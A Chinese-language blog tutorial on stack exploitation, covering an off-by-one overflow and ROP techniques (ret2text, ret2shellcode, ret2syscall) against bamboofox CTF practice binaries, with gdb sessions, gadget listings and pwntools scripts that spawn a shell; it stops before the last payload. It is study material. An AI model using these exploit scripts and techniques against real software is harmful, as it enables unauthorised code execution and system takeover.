+                    <h2 id="off-By-One-缓冲区溢出"><a href="#off-By-One-缓冲区溢出" class="headerlink" title="off-By-One 缓冲区溢出"></a>off-By-One 缓冲区溢出</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​	本文用于填补先前对于二进制漏洞一些理解上的不足，学习off-by-one的漏洞利用方式。<strong>缓冲区溢出的终极目的在于获取目标机器的权限，但是获取权限未必只要一种方式，你可以添加用户，反弹shell、开启一个新的网络链接等</strong>。主要参考：<span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA2LzA3L29mZi1ieS1vbmUtdnVsbmVyYWJpbGl0eS1zdGFjay1iYXNlZC0yLw==">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</span></p>
+<h3 id="单字节溢出案例"><a href="#单字节溢出案例" class="headerlink" title="单字节溢出案例"></a>单字节溢出案例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+
+<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+ <span class="token function">bar</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [1] */</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+ <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+ <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [2] */</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* [3] */</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Attempted Buffer Overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+ <span class="token function">foo</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* [4] */</span>
+ <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​	<strong>当目标缓冲区大小与写入长度相一致时，会出现单字节溢出</strong>，因为在strcpy的处理过程中，将传入的参数都视为视为是字符串，默认会在复制过后在末尾添加一个字节的0x00，因此会向buffer的第256个位置处写0x00。	</p>
+<p>​	该操作会向下一个位置中写入0x00，下一个位置有可能就是ebp的存储位置，其实也就是栈区基地址。但是只能更改一个字节，其实也就是ebp指针的最低字节，当前过程在退出的过程中，执行leave指令，会将被修改后的ebp写入到寄存器中。</p>
+<p>​	<strong>栈基址</strong>的高位迁移。由于只能向ebp的低字节中写入一个0，也就是稳定会将ebp抬高，从而更改栈的位置。当前ebp的较高位置其实就是用于存放当前函数临时变量的位置，其实也就控制了栈。在上述例子中，在foo函数中完成了栈的抬升，将栈设置到可控区域中。在main函数退出时就会取出错误的返回地址return，进行间接的控制流劫持操作。</p>
+<h3 id="栈迁移不可用的情况"><a href="#栈迁移不可用的情况" class="headerlink" title="栈迁移不可用的情况"></a>栈迁移不可用的情况</h3><ul>
+<li><p><strong>单字节溢出无法影响ebp</strong>：如果本身当前的缓冲区在ebp之上，但是并不能</p>
+</li>
+<li><p><strong>栈基地址的低位本身就是0x00</strong>：</p>
+</li>
+<li><p><strong>程序本身存在16字节对齐的情况</strong>：其实默认情况下gcc编译器都会对程序进行16字节的对齐，因此在创建堆栈空间之前会将esp的最后四个位进行清零操作。（因为最后四位正好是表示16个字节</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x08048497 &lt;+0&gt;: push %ebp
+0x08048498 &lt;+1&gt;: mov %esp,%ebp
+0x0804849a &lt;+3&gt;: push %edi
+0x0804849b &lt;+4&gt;: and $0xfffffff0,%esp               //Stack space aligned to 16 byte boundary
+0x0804849e &lt;+7&gt;: sub $0x20,%esp   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<p>关于栈迁移请参考该位置<a href="https://alazymechnaic.github.io/2023/05/02/bypass-nx/">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</a></p>
+
+                
+            </div>
+        </article>
+    
+        <article class="post-abstract">
+            <div class="post-title">
+                <h2><a class="post-title-link" href="/2023/04/26/stack-based-overflow/">Stack_based_overflow</a></h2>
+            </div>
+            <div class="post-meta">
+                <span class="post-time">2023-04-26</span>
+                
+            </div>
+            <div class="post-content">
+                
+                    <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<ul>
+<li>程序存在溢出，并且可以控制返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h2 id="ret2text¶"><a href="#ret2text¶" class="headerlink" title="ret2text¶"></a>ret2text<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJ0ZXh0">¶</span></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18x">¶</span></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18y">¶</span></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnRleHQvYmFtYm9vZm94LXJldDJ0ZXh0L3JldDJ0ZXh0">ret2text</span></p>
+<p>首先，查看一下程序的保护机制</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2text checksec ret2text
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("There is something amazing here, do you know anything?");
+  gets((char *)&amp;v4);
+  printf("Maybe I will tell you next time !");
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:080485FD secure          proc near
+.text:080485FD
+.text:080485FD input           = dword ptr -10h
+.text:080485FD secretcode      = dword ptr -0Ch
+.text:080485FD
+.text:080485FD                 push    ebp
+.text:080485FE                 mov     ebp, esp
+.text:08048600                 sub     esp, 28h
+.text:08048603                 mov     dword ptr [esp], 0 ; timer
+.text:0804860A                 call    _time
+.text:0804860F                 mov     [esp], eax      ; seed
+.text:08048612                 call    _srand
+.text:08048617                 call    _rand
+.text:0804861C                 mov     [ebp+secretcode], eax
+.text:0804861F                 lea     eax, [ebp+input]
+.text:08048622                 mov     [esp+4], eax
+.text:08048626                 mov     dword ptr [esp], offset unk_8048760
+.text:0804862D                 call    ___isoc99_scanf
+.text:08048632                 mov     eax, [ebp+input]
+.text:08048635                 cmp     eax, [ebp+secretcode]
+.text:08048638                 jnz     short locret_8048646
+.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
+.text:08048641                 call    _system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p>
+<p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:080486A7                 lea     eax, [esp+1Ch]
+.text:080486AB                 mov     [esp], eax      ; s
+.text:080486AE                 call    _gets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>
+<pre class="line-numbers language-none"><code class="language-none">gef➤  b *0x080486AE
+Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
+gef➤  r
+There is something amazing here, do you know anything?
+
+Breakpoint 1, 0x080486ae in main () at ret2text.c:24
+24      gets(buf);
+───────────────────────────────────────────────────────────────────────[ registers ]────
+$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebx   : 0x00000000
+$ecx   : 0xffffffff
+$edx   : 0xf7faf870  →  0x00000000
+$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebp   : 0xffffcdc8  →  0x00000000
+$esi   : 0xf7fae000  →  0x001b1db0
+$edi   : 0xf7fae000  →  0x001b1db0
+$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p>
+<ul>
+<li>s 的地址为 0xffffcd5c</li>
+<li>s 相对于 ebp 的偏移为 0x6c</li>
+<li>s 相对于返回地址的偏移为 0x6c+4</li>
+</ul>
+<p>最后的 payload 如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">##!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2text')
+target = 0x804863a
+sh.sendline('A' * (0x6c+4) + p32(target))
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="ret2shellcode¶"><a href="#ret2shellcode¶" class="headerlink" title="ret2shellcode¶"></a>ret2shellcode<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzaGVsbGNvZGU=">¶</span></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18z">¶</span></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI180">¶</span></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnNoZWxsY29kZS9yZXQyc2hlbGxjb2RlLWV4YW1wbGUvcmV0MnNoZWxsY29kZQ==">ret2shellcode</span></p>
+<p>首先检测程序开启的保护</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2shellcode checksec ret2shellcode
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No system for you this time !!!");
+  gets((char *)&amp;v4);
+  strncpy(buf2, (const char *)&amp;v4, 0x64u);
+  printf("bye bye ~");
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
+<pre class="line-numbers language-none"><code class="language-none">.bss:0804A080                 public buf2
+.bss:0804A080 ; char buf2[100]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">gef➤  b main
+Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
+gef➤  r
+Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 
+
+Breakpoint 1, main () at ret2shellcode.c:8
+8       setvbuf(stdout, 0LL, 2, 0LL);
+─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
+      6  int main(void)
+      7  {
+ →    8      setvbuf(stdout, 0LL, 2, 0LL);
+      9      setvbuf(stdin, 0LL, 1, 0LL);
+     10  
+─────────────────────────────────────────────────────────────────────[ trace ]────
+[#0] 0x8048536 → Name: main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  vmmap 
+Start      End        Offset     Perm Path
+0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
+0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
+0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
+0xf7faf000 0xf7fb2000 0x00000000 rwx 
+0xf7fd3000 0xf7fd5000 0x00000000 rwx 
+0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
+0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
+0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffb000 0xf7ffc000 0x00000000 rwx 
+0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
+0xfffdd000 0xffffe000 0x00000000 rwx [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>
+<pre class="line-numbers language-none"><code class="language-none">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
+<p>具体的 payload 如下</p>
+<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI181">¶</span></h3><ul>
+<li>sniperoj-pwn100-shellcode-x86-64</li>
+</ul>
+<h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzeXNjYWxs">¶</span></h2><h3 id="原理-¶-2"><a href="#原理-¶-2" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI182">¶</span></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<h3 id="例子-¶-2"><a href="#例子-¶-2" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI183">¶</span></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnN5c2NhbGwvYmFtYm9vZm94LXJldDJzeXNjYWxsL3JvcA==">ret2syscall</span></p>
+<p>首先检测程序开启的保护</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall checksec rop
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("This time, no system() and NO SHELLCODE!!!");
+  puts("What do you plan to do?");
+  gets(&amp;v4);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUIzJUJCJUU3JUJCJTlGJUU4JUIwJTgzJUU3JTk0JUE4">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</span></li>
+</ul>
+<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
+<pre class="line-numbers language-none"><code class="language-none">execve("/bin/sh",NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<p>首先，我们来寻找控制 eax 的 gadgets</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>
+<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里，我选择</p>
+<pre class="line-numbers language-none"><code class="language-none">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个可以直接控制其它三个寄存器。</p>
+<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
+Strings information
+============================================================
+0x080be408 : /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
+Gadgets information
+============================================================
+0x08049421 : int 0x80
+0x080938fe : int 0xbb
+0x080869b5 : int 0xf6
+0x0807b4d4 : int 0xfc
+
+Unique gadgets found: 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同时，也找到对应的地址了。</p>
+<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
